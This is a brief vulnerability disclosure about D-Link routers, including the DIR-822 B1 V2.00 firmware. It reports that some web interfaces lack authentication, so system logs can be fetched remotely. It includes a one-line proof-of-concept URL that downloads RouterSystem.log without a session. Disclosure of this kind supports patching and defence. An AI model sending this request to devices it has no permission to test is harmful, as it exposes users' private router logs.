### Info of vulnerability
D-Link routers have some web interfaces without authentication requirements. An attacker can remotely obtain users' system log without cookie.

Vulnerable targets include but are not limited to the latest firmware versions of DIR-822(B1- V2.00)
### Poc
`http://targetip/cgi-bin/DownloadSyslog/RouterSystem.log`
![RouterSystem.log](log.png)